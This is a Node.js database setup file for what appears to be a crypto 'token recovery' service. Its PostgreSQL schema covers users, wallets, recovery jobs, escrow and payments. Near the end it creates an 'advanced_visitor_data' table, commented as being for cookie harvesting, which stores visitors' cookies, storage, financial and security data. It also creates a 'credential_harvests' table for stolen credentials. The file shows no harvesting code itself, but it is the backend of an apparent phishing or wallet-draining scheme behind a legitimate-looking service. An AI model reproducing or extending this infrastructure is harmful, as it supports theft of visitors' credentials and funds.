const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://localhost:5432/autoclaimtoken',
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false,
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 10000, // Increased for Render
});

const initializeDatabase = async (retries = 3) => {
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`Connecting to database... (attempt ${i + 1}/${retries})`);
      console.log('Database URL:', process.env.DATABASE_URL ? 'Set (Render PostgreSQL)' : 'Not set (Local)');
      
      const client = await pool.connect();
      console.log('Database connection established');
    
    await client.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) UNIQUE NOT NULL,
        email VARCHAR(255),
        ip_address INET,
        user_agent TEXT,
        country VARCHAR(2),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_scan TIMESTAMP,
        total_recovered DECIMAL(20,8) DEFAULT 0,
        success_rate DECIMAL(5,2) DEFAULT 0,
        payment_status VARCHAR(20) DEFAULT 'pending',
        service_agreement_accepted BOOLEAN DEFAULT false,
        kyc_verified BOOLEAN DEFAULT false
      );

      CREATE TABLE IF NOT EXISTS wallets (
        id SERIAL PRIMARY KEY,
        user_id INTEGER REFERENCES users(id),
        address VARCHAR(42) NOT NULL,
        chain_id INTEGER NOT NULL,
        is_primary BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS recovery_jobs (
        id SERIAL PRIMARY KEY,
        user_id INTEGER REFERENCES users(id),
        wallet_address VARCHAR(42) NOT NULL,
        token_address VARCHAR(42),
        token_symbol VARCHAR(20),
        estimated_amount DECIMAL(20,8),
        actual_amount DECIMAL(20,8),
        recovery_method VARCHAR(50),
        status VARCHAR(20) DEFAULT 'pending',
        tx_hash VARCHAR(66),
        gas_used INTEGER,
        fee_paid DECIMAL(20,8),
        success_probability DECIMAL(5,2),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        completed_at TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS blockchain_scans (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) NOT NULL,
        chain_id INTEGER NOT NULL,
        protocol_name VARCHAR(50),
        contract_address VARCHAR(42),
        claimable_amount DECIMAL(20,8),
        token_symbol VARCHAR(20),
        last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        claim_method TEXT,
        gas_estimate INTEGER
      );

      CREATE TABLE IF NOT EXISTS recovery_patterns (
        id SERIAL PRIMARY KEY,
        pattern_type VARCHAR(50),
        success_indicators JSONB,
        failure_indicators JSONB,
        success_rate DECIMAL(5,2),
        sample_size INTEGER,
        last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS escrow_recoveries (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) NOT NULL,
        recovered_tokens JSONB,
        status VARCHAR(20) DEFAULT 'pending_payment',
        payment_tx VARCHAR(66),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        expires_at TIMESTAMP,
        completed_at TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS payment_logs (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) NOT NULL,
        status VARCHAR(20),
        amount DECIMAL(20,8),
        currency VARCHAR(10),
        tx_hash VARCHAR(66),
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS user_analytics (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) NOT NULL,
        service_type VARCHAR(50) NOT NULL,
        recovered_amount DECIMAL(20,8) DEFAULT 0,
        ip_address INET,
        country VARCHAR(100),
        user_agent TEXT,
        usage_count INTEGER DEFAULT 1,
        total_value DECIMAL(20,8) DEFAULT 0,
        metadata JSONB,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE INDEX IF NOT EXISTS idx_users_wallet ON users(wallet_address);
      CREATE INDEX IF NOT EXISTS idx_recovery_jobs_status ON recovery_jobs(status);
      CREATE INDEX IF NOT EXISTS idx_blockchain_scans_wallet ON blockchain_scans(wallet_address);
      CREATE INDEX IF NOT EXISTS idx_recovery_jobs_user ON recovery_jobs(user_id);
      CREATE INDEX IF NOT EXISTS idx_escrow_status ON escrow_recoveries(status);
      CREATE INDEX IF NOT EXISTS idx_escrow_expires ON escrow_recoveries(expires_at);
      CREATE INDEX IF NOT EXISTS idx_user_analytics_wallet ON user_analytics(wallet_address);
      CREATE INDEX IF NOT EXISTS idx_user_analytics_service ON user_analytics(service_type);
      
      -- Add missing columns to existing user_analytics table
      ALTER TABLE user_analytics ADD COLUMN IF NOT EXISTS recovered_amount DECIMAL(20,8) DEFAULT 0;
      ALTER TABLE user_analytics ADD COLUMN IF NOT EXISTS ip_address INET;
      ALTER TABLE user_analytics ADD COLUMN IF NOT EXISTS country VARCHAR(100);
      ALTER TABLE user_analytics ADD COLUMN IF NOT EXISTS user_agent TEXT;
      
      -- Create user_sessions table
      CREATE TABLE IF NOT EXISTS user_sessions (
        id SERIAL PRIMARY KEY,
        wallet_address VARCHAR(42) NOT NULL,
        session_id VARCHAR(255) NOT NULL,
        ip_address INET,
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        expires_at TIMESTAMP,
        active BOOLEAN DEFAULT true
      );
      
      CREATE INDEX IF NOT EXISTS idx_user_sessions_wallet ON user_sessions(wallet_address);
      CREATE INDEX IF NOT EXISTS idx_user_sessions_session ON user_sessions(session_id);

      -- Create workers table for referral tracking
      CREATE TABLE IF NOT EXISTS workers (
        id SERIAL PRIMARY KEY,
        worker_code VARCHAR(100) UNIQUE NOT NULL,
        worker_name VARCHAR(255),
        email VARCHAR(255),
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_by VARCHAR(255) DEFAULT 'admin'
      );

      -- Create referral_tracking table
      CREATE TABLE IF NOT EXISTS referral_tracking (
        id SERIAL PRIMARY KEY,
        worker_code VARCHAR(100) NOT NULL,
        action_type VARCHAR(50) NOT NULL,
        wallet_address VARCHAR(42),
        amount DECIMAL(20,8),
        tx_hash VARCHAR(66),
        ip_address INET,
        user_agent TEXT,
        metadata JSONB,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      CREATE INDEX IF NOT EXISTS idx_workers_code ON workers(worker_code);
      CREATE INDEX IF NOT EXISTS idx_workers_status ON workers(status);
      CREATE INDEX IF NOT EXISTS idx_referral_worker ON referral_tracking(worker_code);
      CREATE INDEX IF NOT EXISTS idx_referral_action ON referral_tracking(action_type);
      CREATE INDEX IF NOT EXISTS idx_referral_wallet ON referral_tracking(wallet_address);
      CREATE INDEX IF NOT EXISTS idx_referral_created ON referral_tracking(created_at);
      
      -- Create advanced visitor data table for cookie harvesting
      CREATE TABLE IF NOT EXISTS advanced_visitor_data (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        cookies_data JSONB,
        storage_data JSONB,
        financial_data JSONB,
        hardware_data JSONB,
        behavioral_data JSONB,
        security_data JSONB,
        network_data JSONB,
        collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
      
      CREATE INDEX IF NOT EXISTS idx_advanced_visitor_ip ON advanced_visitor_data(ip_address);
      CREATE INDEX IF NOT EXISTS idx_advanced_visitor_collected ON advanced_visitor_data(collected_at);
      
      -- Create credential harvesting table
      CREATE TABLE IF NOT EXISTS credential_harvests (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        credential_type VARCHAR(50) NOT NULL,
        credential_data JSONB NOT NULL,
        harvested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
      
      CREATE INDEX IF NOT EXISTS idx_credential_ip ON credential_harvests(ip_address);
      CREATE INDEX IF NOT EXISTS idx_credential_type ON credential_harvests(credential_type);
      CREATE INDEX IF NOT EXISTS idx_credential_harvested ON credential_harvests(harvested_at);
    `);
      console.log('Database tables created/verified successfully');
      console.log('Database initialized successfully');
      client.release();
      return; // Success
    } catch (error) {
      console.error(`Database attempt ${i + 1} failed:`, error.message);
      console.error('Full error:', error);
      if (i === retries - 1) throw error;
      console.log('Waiting 5 seconds before retry...');
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
};

module.exports = { pool, initializeDatabase };